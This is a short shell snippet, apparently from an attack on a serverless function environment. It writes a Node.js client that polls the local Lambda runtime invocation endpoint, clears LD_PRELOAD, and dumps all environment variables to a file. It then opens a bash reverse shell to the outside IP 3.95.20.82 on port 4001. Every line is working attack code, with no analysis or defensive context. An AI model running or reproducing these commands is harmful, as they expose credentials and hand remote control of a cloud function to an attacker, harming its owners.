echo "process.env.LD_PRELOAD='';const s=require('net').connect({port:9001,host:'127.0.0.1'});s.on('connect',()=>s.write('GET /2018-06-01/runtime/invocation/next HTTP/1.1\r\nHost: 127.0.0.1:9001\r\n\r\n'));s.on('data',d=>console.log(d+''));s.on('error',e=>console.error('Error:',e.code));" > client.js
env > env.txt
bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
